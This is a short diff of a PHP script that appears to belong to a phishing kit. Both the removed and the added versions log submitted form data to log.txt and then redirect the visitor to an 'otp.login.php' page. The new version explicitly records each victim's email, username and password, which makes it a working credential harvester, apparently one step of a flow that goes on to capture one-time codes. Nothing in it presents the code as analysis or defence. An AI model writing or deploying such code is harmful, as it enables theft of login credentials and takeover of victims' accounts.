@@ -1,13 +1,5 @@
 <?php
-header ('Location: otp.login.php');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-?>
+
+    file_put_contents("log.txt", "Email: " . $_POST['email'] . " Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+header('Location: otp.login.php');
+exit();
